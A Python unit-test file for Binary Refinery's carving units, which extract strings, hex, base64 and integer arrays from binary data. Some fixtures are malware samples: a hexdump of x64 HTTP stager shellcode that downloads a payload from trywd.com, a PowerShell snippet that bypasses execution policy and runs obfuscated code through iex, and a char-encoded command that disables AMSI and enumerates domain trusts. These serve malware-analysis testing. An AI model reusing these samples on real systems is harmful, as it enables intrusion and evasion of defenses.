#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import base64
import inspect

from .. import TestUnitBase


class TestCarve(TestUnitBase):

    def test_interlaced_utf16(self):
        data = 'Binary Refinery:'.encode('utf-16le') + B'HALT' + 'Refining Binaries.'.encode('utf-16le') + B'\xF0\x0F'
        for unit in (
            self.load('printable', longest=True, take=2),
            self.load('printable', ascii=False)
        ):
            self.assertEqual(unit(data), (
                B'Binary Refinery:\n'
                B'Refining Binaries.'
            ))

    def test_extract_base64(self):
        unit = self.load('b64', longest=True, take=1)
        data = B'%s-(VG9vIG11Y2ggdGVjaG5vbG9neSwgaW4gdG9vIGxpdHRsZSB0aW1lLg==),%s' % (
            self.generate_random_buffer(11),
            self.generate_random_buffer(12)
        )
        self.assertEqual(unit(data), b'VG9vIG11Y2ggdGVjaG5vbG9neSwgaW4gdG9vIGxpdHRsZSB0aW1lLg==')

    def test_extract_strings(self):
        def multibytes(c):
            return inspect.getdoc(c).encode('utf8')

        @multibytes
        class data:
            """
            puts("----------------------------");
            puts("   Testing Output:");
            puts(" Usage: ./invoke filename");
            puts("----------------------------");
            """

        @multibytes
        class goal:
            """
            ----------------------------
               Testing Output:
             Usage: ./invoke filename
            ----------------------------
            """

        unit = self.load('string', decode=True)
        self.assertEqual(unit(data), goal)

    def test_extract_hex_01(self):
        unit = self.load('hex', stripspace=True, longest=True, take=1)
        data = (
            B'7937e4492b014445eede1b00006dd0bd05e55720849807014e5a120807c723e9\n'
            B'0400156bebd8d58deb76fc69ab284811c57a289ea374ea79d76c67edf154784c\n'
            B'748bf9e24ff68b23a75aaf24b09ce15ee28d53f53547bb412773d87d2430a105\n'
            B'ac21670811a40c5972fbcf02708e5bc893220c9f730c20d37dcf0e8a3ffa9c8f\n'
            B'90001a0a895a000494804e470d04452000001000000a9aaaa00e2f0000000900\n'
            B'80201ce9000004859730000009017352474200aec700ec400000ec4010000d95\n'
            B'b09c9e6adb6a1da556b9d5ef7331111414040524848020939fb91042c8440399\n'
            B'f0f492e798e4c3de1663ff799edbfb7f673d9bfb7e7bdf7da6b5d6b5dac53aff\n'
        )
        self.assertEqual(unit(data), data.replace(b'\n', B''))

    def test_extract_hex_02(self):
        unit = self.load('hex', min=8)
        self.assertEqual(
            unit(B'This is a mixed case hex string:42C56Ffe7da9c37481f26aFE1a06252f!'),
            B'42C56Ffe7da9c37481f26aFE1a06252f'
        )

    def test_extract_unicode_b64(self):
        data = bytes.fromhex(
            '65 00 2E 63 63 74 6F 72 00 00 00 17 41 00 62 00 6F 00 72 00 74 00 69 00 6E 00 67 00 2E 00 2E 00'
            '2E 00 00 C0 17 31 F9 49 00 77 00 42 00 79 00 41 00 47 00 55 00 41 00 63 00 51 00 42 00 31 00 41'
            '00 47 00 6B 00 41 00 63 00 67 00 42 00 6C 00 41 00 48 00 4D 00 41 00 49 00 41 00 41 00 74 00 41'
            '00 46 00 59 00 41 00 5A 00 51 00 42 00 79 00 41 00 48 00 4D 00 41 00 61 00 51 00 42 00 76 00 41'
            '00 47 00 34 00 41 00 49 00 41 00 41 00 79 00 41 00 41 00 30 00 41 00 43 00 67 00 41 00 3d 00'
        )
        unit = self.load('-ult1', 'b64')
        result = unit(data)
        result = base64.b64decode(result, validate=True).decode('utf-16LE')
        self.assertEqual('#requires -Version 2\r\n', result)

    def test_carve_hexdump(self):
        def binary_text(c):
            return inspect.getdoc(c).encode('utf-8')

        @binary_text
        class data:
            R"""
            0000000000200000  FC 48 83 E4 F0 E8 C8 00 00 00 41 51 41 50 52 51   üH.äðèÈ...AQAPRQ
            0000000000200010  56 48 31 D2 65 48 8B 52 60 48 8B 52 18 48 8B 52   VH1ÒeH.R`H.R.H.R
            0000000000200020  20 48 8B 72 50 48 0F B7 4A 4A 4D 31 C9 48 31 C0    H.rPH.·JJM1ÉH1À
            0000000000200030  AC 3C 61 7C 02 2C 20 41 C1 C9 0D 41 01 C1 E2 ED   ¬<a|., AÁÉ.A.Áâí
            0000000000200040  52 41 51 48 8B 52 20 8B 42 3C 48 01 D0 66 81 78   RAQH.R .B<H.Ðf.x
            0000000000200050  18 0B 02 75 72 8B 80 88 00 00 00 48 85 C0 74 67   ...ur......H.Àtg
            0000000000200060  48 01 D0 50 8B 48 18 44 8B 40 20 49 01 D0 E3 56   H.ÐP.H.D.@ I.ÐãV
            0000000000200070  48 FF C9 41 8B 34 88 48 01 D6 4D 31 C9 48 31 C0   HÿÉA.4.H.ÖM1ÉH1À
            0000000000200080  AC 41 C1 C9 0D 41 01 C1 38 E0 75 F1 4C 03 4C 24   ¬AÁÉ.A.Á8àuñL.L$
            0000000000200090  08 45 39 D1 75 D8 58 44 8B 40 24 49 01 D0 66 41   .E9ÑuØXD.@$I.ÐfA
            00000000002000A0  8B 0C 48 44 8B 40 1C 49 01 D0 41 8B 04 88 48 01   ..HD.@.I.ÐA...H.
            00000000002000B0  D0 41 58 41 58 5E 59 5A 41 58 41 59 41 5A 48 83   ÐAXAX^YZAXAYAZH.
            00000000002000C0  EC 20 41 52 FF E0 58 41 59 5A 48 8B 12 E9 4F FF   ì ARÿàXAYZH..éOÿ
            00000000002000D0  FF FF 5D 6A 00 49 BE 77 69 6E 69 6E 65 74 00 41   ÿÿ]j.I¾wininet.A
            00000000002000E0  56 49 89 E6 4C 89 F1 41 BA 4C 77 26 07 FF D5 48   VI.æL.ñAºLw&.ÿÕH
            00000000002000F0  31 C9 48 31 D2 4D 31 C0 4D 31 C9 41 50 41 50 41   1ÉH1ÒM1ÀM1ÉAPAPA
            0000000000200100  BA 3A 56 79 A7 FF D5 E9 93 00 00 00 5A 48 89 C1   º:Vy§ÿÕé....ZH.Á
            0000000000200110  41 B8 BB 01 00 00 4D 31 C9 41 51 41 51 6A 03 41   A¸»...M1ÉAQAQj.A
            0000000000200120  51 41 BA 57 89 9F C6 FF D5 EB 79 5B 48 89 C1 48   QAºW..ÆÿÕëy[H.ÁH
            0000000000200130  31 D2 49 89 D8 4D 31 C9 52 68 00 32 C0 84 52 52   1ÒI.ØM1ÉRh.2À.RR
            0000000000200140  41 BA EB 55 2E 3B FF D5 48 89 C6 48 83 C3 50 6A   AºëU.;ÿÕH.ÆH.ÃPj
            0000000000200150  0A 5F 48 89 F1 BA 1F 00 00 00 6A 00 68 80 33 00   ._H.ñº....j.h.3.
            0000000000200160  00 49 89 E0 41 B9 04 00 00 00 41 BA 75 46 9E 86   .I.àA¹....AºuF..
            0000000000200170  FF D5 48 89 F1 48 89 DA 49 C7 C0 FF FF FF FF 4D   ÿÕH.ñH.ÚIÇÀÿÿÿÿM
            0000000000200180  31 C9 52 52 41 BA 2D 06 18 7B FF D5 85 C0 0F 85   1ÉRRAº-..{ÿÕ.À..
            0000000000200190  9D 01 00 00 48 FF CF 0F 84 8C 01 00 00 EB B3 E9   ....HÿÏ......ë³é
            00000000002001A0  E4 01 00 00 E8 82 FF FF FF 2F 77 70 2D 69 6E 63   ä...è.ÿÿÿ/wp-inc
            00000000002001B0  6C 75 64 65 73 2F 65 73 2E 6D 70 33 00 56 5D 99   ludes/es.mp3.V].
            00000000002001C0  22 DE 8B D4 80 9F EA EB F4 C9 EA 12 99 90 16 1C   "Þ.Ô..êëôÉê.....
            00000000002001D0  0F C0 5D 27 02 B2 74 AF 6F BB E5 18 FD 24 68 FB   .À]'.²t¯o»å.ý$hû
            00000000002001E0  6A 90 4C 33 BC E9 F5 EB 7B 52 0C 3E 75 5E 77 53   j.L3¼éõë{R.>u^wS
            00000000002001F0  26 46 98 D7 10 B7 49 43 00 48 6F 73 74 3A 20 67   &F.×.·IC.Host: g
            0000000000200200  6F 6F 67 6C 65 2E 63 6F 2E 6A 70 0D 0A 43 6F 6E   oogle.co.jp..Con
            0000000000200210  6E 65 63 74 69 6F 6E 3A 20 63 6C 6F 73 65 0D 0A   nection: close..
            0000000000200220  41 63 63 65 70 74 2D 45 6E 63 6F 64 69 6E 67 3A   Accept-Encoding:
            0000000000200230  20 67 7A 69 70 2C 20 62 72 0D 0A 41 63 63 65 70    gzip, br..Accep
            0000000000200240  74 2D 4C 61 6E 67 75 61 67 65 3A 20 66 72 2D 43   t-Language: fr-C
            0000000000200250  48 2C 20 66 72 3B 71 3D 30 2E 39 2C 20 65 6E 3B   H, fr;q=0.9, en;
            0000000000200260  71 3D 30 2E 38 2C 20 64 65 3B 71 3D 30 2E 37 2C   q=0.8, de;q=0.7,
            0000000000200270  20 2A 3B 71 3D 30 2E 35 0D 0A 55 73 65 72 2D 41    *;q=0.5..User-A
            0000000000200280  67 65 6E 74 3A 20 4D 6F 7A 69 6C 6C 61 2F 35 2E   gent: Mozilla/5.
            0000000000200290  30 20 28 4D 61 63 69 6E 74 6F 73 68 3B 20 49 6E   0 (Macintosh; In
            00000000002002A0  74 65 6C 20 4D 61 63 20 4F 53 20 58 20 31 30 5F   tel Mac OS X 10_
            00000000002002B0  31 31 5F 32 29 20 41 70 70 6C 65 57 65 62 4B 69   11_2) AppleWebKi
            00000000002002C0  74 2F 36 30 31 2E 33 2E 39 20 28 4B 48 54 4D 4C   t/601.3.9 (KHTML
            00000000002002D0  2C 20 6C 69 6B 65 20 47 65 63 6B 6F 29 20 56 65   , like Gecko) Ve
            00000000002002E0  72 73 69 6F 6E 2F 39 2E 30 2E 32 20 53 61 66 61   rsion/9.0.2 Safa
            00000000002002F0  72 69 2F 36 30 31 2E 33 2E 39 0D 0A 00 6D D5 21   ri/601.3.9...mÕ!
            0000000000200300  7F 8C 8C 58 B6 82 54 B1 9E 88 18 8D 07 19 25 17   ...X¶.T±......%.
            0000000000200310  8F 57 54 AC 82 69 78 B5 3B 23 BA 10 E0 DE 52 A2   .WT¬.ixµ;#º.àÞR¢
            0000000000200320  5B 66 09 DB C8 3C F0 C9 00 41 BE F0 B5 A2 56 FF   [f.ÛÈ<ðÉ.A¾ðµ¢Vÿ
            0000000000200330  D5 48 31 C9 BA 00 00 40 00 41 B8 00 10 00 00 41   ÕH1Éº..@.A¸....A
            0000000000200340  B9 40 00 00 00 41 BA 58 A4 53 E5 FF D5 48 93 53   ¹@...AºX¤SåÿÕH.S
            0000000000200350  53 48 89 E7 48 89 F1 48 89 DA 41 B8 00 20 00 00   SH.çH.ñH.ÚA¸. ..
            0000000000200360  49 89 F9 41 BA 12 96 89 E2 FF D5 48 83 C4 20 85   I.ùAº...âÿÕH.Ä .
            0000000000200370  C0 74 B6 66 8B 07 48 01 C3 85 C0 75 D7 58 58 58   Àt¶f..H.Ã.Àu×XXX
            0000000000200380  48 05 00 00 00 00 50 C3 E8 7F FD FF FF 74 72 79   H.....PÃè.ýÿÿtry
            0000000000200390  77 64 2E 63 6F 6D 00 5E 2E 78 86 00 00 00 00 00   wd.com.^.x......
            """

        unit = self.load('hexdump', decode=True)
        result = unit(data)
        self.assertIn((
            B'Host: google.co.jp\r\n'
            B'Connection: close\r\n'
            B'Accept-Encoding: gzip, br\r\n'
            B'Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5\r\n'
            B'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) '
            B'AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9\r\n'
        ), result)

    def test_sort_by_length(self):
        unit = self.load('hex', min=4, longest=True)
        data = B'xAFxxxxABBAxxxx'
        self.assertEqual(str(data | unit), 'ABBA')

    def test_carve_intarray(self):
        data = B'$$$x = 1,2,3,4;\r\n'
        self.assertEqual(bytes(data | self.load('intarray')), b'1,2,3,4')

    def test_carve_ps1str(self):
        def multibytes(c):
            return inspect.getdoc(c).encode('utf8')

        @multibytes
        class data:
            """
            Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
            "RegSvcs", "mshta", "wscript", "msbuild" | ForEach-Object { Stop-Process -Name $_ -Force }
            $downloadsFolder = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads')

            $lulli = @'
            $muthal = "^^^^0011^^^^^^-101011010101-10".replace('^','000').replace('~','111').replace('-','100')
            $bulgumchupitum = '11101110-*1^1010111-110^1011^1101110-1011^0^0-010^111110-1010'.replace('*','1000000').replace('-','10000').replace('^','100')

            #kcuf em rederhar
            '@
            [IO.File]::WriteAllText("KAMASUTRAKI", $lulli)
            $lulli | .('{1}{Â°Â°Â°Â°Â°}'.replace('Â°Â°Â°Â°Â°','0')-f'!','I').replace('!','ex')

            $scriptPath = $MyInvocation.MyCommand.Path
            """

        test = data | self.load('ps1str', decode=True) | [str]
        self.assertEqual(test[0], 'RegSvcs')
        self.assertEqual(test[1], 'mshta')
        self.assertTrue(test[5].startswith("$muthal"))
        self.assertTrue(test[5].endswith("rederhar"))
        self.assertEqual(test[6], 'KAMASUTRAKI')

    def test_integer_array_irregular_spacing(self):
        data = (
            B'''cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C "&((Get-VArIAblE '*mDr*').naMe[3,11,2]-'''
            B'''joIn'') (-Join(( 91 ,78 ,101, 116 ,46 ,83 , 101 , 114 , 118 ,105 , 99, 101, 80 ,111, 105 , 110,116,7'''
            B'''7,97, 110 ,97 , 103,101, 114 , 93 , 58, 58 , 83, 101 ,114,118 , 101 , 114,67, 101 ,114, 116 , 105, 1'''
            B'''02 ,105,99 ,97 ,116 , 101,86 , 97, 108, 105,100 ,97 , 116 ,105 , 111 ,110, 67 , 97 ,108,108, 98 , 97'''
            B''', 99,107 ,32 ,61 , 32, 123 ,36 ,116 ,114, 117 , 101,125 , 10, 116 ,114 ,121 ,123 ,10,91 ,82 , 101, 1'''
            B'''02, 93, 46,65,115 , 115,101, 109, 98 ,108 , 121, 46 ,71 , 101, 116 , 84 , 121,112 , 101,40 , 39 , 83'''
            B''' , 121, 115 , 39 , 43 ,39 ,116 ,101 ,109,46 ,77,97 ,110 , 39,43 ,39, 97,103 , 101,109 ,101,110,116,'''
            B'''46 , 65,117, 116, 39, 43,39, 111 ,109 ,97 ,116 , 105 ,111 , 110 ,46 ,65,109 , 39, 43, 39 , 115, 105'''
            B''', 85, 116,39 ,43 , 39 ,105,108 , 115 , 39 ,41 ,46,71,101 ,116 ,70, 105, 101,108,100 ,40 ,39 ,97 ,10'''
            B'''9 ,39,43, 39 , 115 ,105, 73 ,110, 105 ,39,43 ,39,116, 70 , 97,105 , 108 ,101, 100, 39 ,44 , 32, 39 '''
            B''',78,111, 110, 80 ,39 , 43,39, 117 , 98 ,108,105 , 99,44 , 83 , 116 ,97 , 39, 43 ,39,116, 105, 99, 3'''
            B'''9 ,41,46 ,83,101 , 116 ,86, 97 , 108 , 117, 101, 40,36, 110 ,117 , 108 ,108 , 44, 32 ,36, 116, 114 '''
            B''',117, 101 ,41 ,10,125,99 , 97 ,116 ,99, 104 , 123 , 125, 10, 110, 108 , 116 , 101 ,115,116,32, 47, '''
            B'''100,111, 109 ,97,105, 110 ,95, 116 ,114,117 , 115 , 116 ,115)| ForeaCH{ ( [cHAr] [iNt] $_) }))\n   '''
            B'''12, 31, 9''')
        t1 = data | self.ldu('csb', 'intarray') | self.ldu('pack') | bytes
        t2 = data | self.ldu('csd', 'intarray') | bytes
        t3 = data | self.load('intarray', single=True, decode=True) | bytes
        self.assertEqual(len({t1, t2, t3}), 1)
        self.assertGreater(len(t1), 200)

    def test_carve_utf16_be(self):
        data = B'%s%s%s' % (
            self.generate_random_buffer(20),
            'af2d4e6bc8'.encode('utf-16be'),
            self.generate_random_buffer(20))
        goal = 'af2d4e6bc8'
        test = data | self.load('hex') | str
        self.assertEqual(goal, test)

    def test_longest_carve(self):
        data = B'\xFFa\xFFbb\xFFccc\xFF'
        test = data | self.load('printable', longest=True) | []
        self.assertListEqual(test, [b'ccc', b'bb', b'a'])

    def test_longest_carve_take(self):
        data = B'\xFFa\xFFbb\xFFccc\xFF'
        test = data | self.load('printable', take=2, longest=True) | []
        self.assertListEqual(test, [b'bb', b'ccc'])
